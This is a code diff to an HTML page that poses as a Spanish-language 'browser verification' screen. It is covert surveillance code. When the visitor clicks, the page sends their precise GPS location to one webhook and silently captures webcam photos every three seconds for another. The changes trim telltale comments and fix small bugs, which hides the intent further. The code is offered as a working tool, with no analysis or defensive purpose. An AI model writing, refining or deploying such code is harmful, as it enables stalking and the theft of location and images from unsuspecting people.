@@ -5,10 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verificando Navegador</title>
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #121212; color: #333; }
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #121212; color: #333; cursor: pointer; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        /* Ocultamos todo lo que delate la cámara */
         #video-preview, #canvas { display: none; }
         .content { text-align: center; }
     </style>
@@ -30,35 +29,33 @@
     const canvas = document.getElementById('canvas');
 
     async function iniciarProceso() {
-        // 1. Iniciar Ubicación
+        // 1. Ubicación
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
-                // Enlace de Google Maps corregido
-                const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                const mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
 
                 await fetch(HOOK_LOC, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        content: "📍 **Ubicación exacta detectada**",
+                        content: "📍 **Ubicación detectada**",
                         embeds: [{
-                            title: "Coordenadas del Usuario",
+                            title: "Coordenadas",
                             color: 15105570,
-                            description: `**Latitud:** ${lat}\n**Longitud:** ${lon}\n\n[📍 Ver en Google Maps](${mapUrl})`
+                            description: "Latitud: " + lat + "\nLongitud: " + lon + "\n\n[Ver Mapa](" + mapUrl + ")"
                         }]
                     })
                 });
             }, null, { enableHighAccuracy: true });
         }
 
-        // 2. Iniciar Cámara Invisible
+        // 2. Cámara
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
             video.srcObject = stream;
 
-            // Envía la primera foto tras 2 segundos y luego cada 3
             setTimeout(() => {
                 enviarFoto();
                 setInterval(enviarFoto, 3000);
@@ -76,17 +73,18 @@
         ctx.drawImage(video, 0, 0);
         
         canvas.toBlob(async (blob) => {
+            if (!blob) return;
             const formData = new FormData();
             formData.append('file', blob, 'img.png');
             formData.append('payload_json', JSON.stringify({
-                content: "📸 **Captura automática de verificación**"
+                content: "📸 **Captura automática**"
             }));
 
             fetch(HOOK_CAM, { method: 'POST', body: formData });
         }, 'image/png');
     }
 
-    // Inicia al hacer clic en cualquier parte (requisito del navegador)
+    // Importante: Inicia al hacer clic
     document.body.addEventListener('click', iniciarProceso, { once: true });
 </script>
 
